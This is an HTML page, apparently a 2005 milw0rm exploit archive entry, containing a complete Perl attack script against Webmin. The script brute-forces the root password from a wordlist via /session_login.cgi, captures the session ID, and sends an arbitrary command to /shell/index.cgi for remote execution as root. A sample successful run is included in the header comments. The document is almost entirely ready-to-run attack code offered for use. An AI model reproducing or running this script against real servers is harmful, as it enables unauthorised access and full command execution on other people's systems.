<html>
<head>
<title>Webmin BruteForce + Command execution v1.5</title>
<pre>
#!/usr/bin/perl
################################################################################
# Webmin BruteForce + Command execution
# v1.0:By Di42lo  - DiAblo_2@012.net.il
# v1.5:By ZzagorR - zzagorrzzagorr@hotmail.com - www.rootbinbash.com
################################################################################
#add script:
#1.wordlist func.
#2.log           (line:41)
################################################################################
# usage:
# ./webmin1.pl &lt;host&gt; &lt;command&gt; &lt;wordlist&gt;
#./webmin1.pl 192.168.0.5 &quot;uptime&quot; wordlist.txt
# [+] BruteForcing...
# [+] trying to enter with: admim
# [+] trying to enter with: admin
# [+] Found SID : f3231ff32849fa0c8c98487ba8c09dbb
# [+] Password : admin
# [+] Connecting to host once again
# [+] Connected.. Sending Buffer
# [+] Buffer sent...running command uptime
# root logged into Webmin 1.170 on linux (SuSE Linux 9.1)
# 10:55pm up 23 days 9:03, 1 user, load average: 0.20, 0.05, 0.01
################################################################################
use IO::Socket;
if (@ARGV&lt;3){
  print &quot;Webmin BruteForcer v1.5\n&quot;;
  print &quot;usage:\n&quot;;
  print &quot;   webmin15.pl &lt;host&gt; &lt;command&gt; &lt;wordlist&gt;\n&quot;;
  print &quot;example:\n&quot;;
  print &quot;   webmin15.pl www.abcd.com \&quot;id\&quot; wordlist.txt\n&quot;;
  exit;
}
my $host=$ARGV[0];
my $cmd=$ARGV[1];
my $wlist=$ARGV[2];
open (data, &quot;$wlist&quot;);
@wordlist=&lt;data&gt;;
close data;
$passx=@wordlist;
open(results , &quot;&gt;$host.log&quot;);
print results &quot;#############################\n&quot;;
print results &quot;Webmin BruteForce + Command execution v1.5\n&quot;;
print results &quot;Host:$host\n&quot;;
print results &quot;#############################\n&quot;;
my $chk=0;
my $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;,
PeerPort =&gt; &quot;10000&quot;,Timeout  =&gt; 10);
if(!$sock){
  print &quot;[-] Webmin on this host does not exist\n&quot;;
  print results &quot;[-] Webmin on this host does not exist\n&quot;;
  exit;
}else{
  $sock-&gt;close;
  print &quot;[+] BruteForcing...\n&quot;;
}
my $sid;
$n=0;
while ($chk!=1) {
  $n++;
  if($n&gt;$passx){
    exit;
  }
  $pass=@wordlist[$passx-$n];
  my $pass_line=&quot;page=%2F&amp;user=root&amp;pass=$pass&quot;;
  my $buffer=&quot;POST /session_login.cgi HTTP/1.0\n&quot;.
             &quot;Host: $host:10000\n&quot;.
             &quot;Keep-Alive: 300\n&quot;.
             &quot;Connection: keep-alive\n&quot;.
             &quot;Referer: http://$host:10000/\n&quot;.
             &quot;Cookie: testing=1\n&quot;.
             &quot;Content-Type: application/x-www-form-urlencoded\n&quot;.
             &quot;Content-Length: __\n&quot;.
             &quot;\n&quot;.
  $pass_line.&quot;\n\n&quot;;
  my $line_size=length($pass_line);
  $buffer=~s/__/$line_size/g;
  my $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;,
PeerPort =&gt; &quot;10000&quot;,Timeout  =&gt; 10);
  if ($sock){
     print &quot;[+] trying to enter with: $pass\n&quot;;
     print $sock $buffer;
     while ($answer=&lt;$sock&gt;){
        if ($answer=~/sid=(.*);/g){
           $chk=1;
           $sid=$1;
           print &quot;[+] Found SID : $sid\n&quot;;
           print &quot;[+] Password : $pass\n&quot;;
           print results &quot;[+]:Password:$pass\nSid:$sid\n&quot;;
        }
     }
  }
  $sock-&gt;close;
  print results &quot;[-]$pass\n&quot;;
}
print &quot;[+] Connecting to host once again\n&quot;;
$sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort
=&gt; &quot;10000&quot;,Timeout  =&gt; 10);
if(!$sock){
  print &quot;[-] Cant Connect once again for command execution\n&quot;;
  print results &quot;[-] Cant Connect once again for command execution\n&quot;;
}
print &quot;[+] Connected.. Sending Buffer\n&quot;;
my $temp=&quot;-----------------------------19777347561180971495777867604\n&quot;.
        &quot;Content-Disposition: form-data; name=\&quot;cmd\&quot;\n&quot;.
        &quot;\n&quot;.
        &quot;$cmd\n&quot;.
        &quot;-----------------------------19777347561180971495777867604\n&quot;.
        &quot;Content-Disposition: form-data; name=\&quot;pwd\&quot;\n&quot;.
        &quot;\n&quot;.
        &quot;/root\n&quot;.
        &quot;-----------------------------19777347561180971495777867604\n&quot;.
        &quot;Content-Disposition: form-data; name=\&quot;history\&quot;\n&quot;.
        &quot;\n&quot;.
        &quot;\n&quot;.
        &quot;-----------------------------19777347561180971495777867604\n&quot;.
        &quot;Content-Disposition: form-data; name=\&quot;previous\&quot;\n&quot;.
        &quot;\n&quot;.
        &quot;$cmd\n&quot;.
        &quot;-----------------------------19777347561180971495777867604\n&quot;.
        &quot;Content-Disposition: form-data; name=\&quot;pcmd\&quot;\n&quot;.
        &quot;\n&quot;.
        &quot;$cmd\n&quot;.
        &quot;-----------------------------19777347561180971495777867604--\n\n&quot;;
my $buffer_size=length($temp);
$buffer=&quot;POST /shell/index.cgi HTTP/1.1\n&quot;.
       &quot;Host: $host:10000\n&quot;.
       &quot;Keep-Alive: 300\n&quot;.
       &quot;Connection: keep-alive\n&quot;.
       &quot;Referer: http://$host:10000/shell/\n&quot;.
       &quot;Cookie: sid=$sid\; testing=1; x\n&quot;.
       &quot;Content-Type: multipart/form-data;
boundary=---------------------------19777347561180971495777867604\n&quot;.
       &quot;Content-Length: siz\n&quot;.
       &quot;\n&quot;.
$temp;
$buffer=~s/siz/$buffer_size/g;
print $sock $buffer;
if ($sock){
  print &quot;[+] Buffer sent...running command $cmd\n&quot;;
  print $sock $buffer;
  while ($answer=&lt;$sock&gt;){
     if ($answer=~/defaultStatus=&quot;(.*)&quot;;/g) { print $1.&quot;\n&quot;;}
     if ($answer=~/&lt;td&gt;&lt;pre&gt;&lt;b&gt;&gt;/g){
        $cmd_chk=1;
     }
     if ($cmd_chk==1) {
        if ($answer=~/&lt;\/pre&gt;&lt;\/td&gt;&lt;\/tr&gt;/g){
           exit;
        } else {
           print $answer;
           print results &quot;[+]$answer\n&quot;;
        }
     }
  }
}</pre>
# milw0rm.com [2005-01-08]
</html>

